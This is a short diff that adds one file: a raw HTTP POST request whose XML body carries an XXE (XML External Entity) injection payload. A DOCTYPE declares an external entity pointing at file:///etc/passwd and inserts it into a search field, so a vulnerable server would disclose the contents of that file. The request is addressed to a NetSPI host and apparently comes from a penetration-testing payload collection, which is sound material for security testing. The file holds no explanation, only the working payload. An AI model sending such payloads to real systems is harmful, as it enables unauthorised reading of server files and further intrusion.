@@ -1,0 +1,12 @@
+POST /netspi HTTP/1.1
+Host: someserver.netspi.com
+Accept: application/json
+Content-Type: application/xml
+Content-Length: 288
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+<search>name</search>
+<value>&xxe;</value>
+</root>
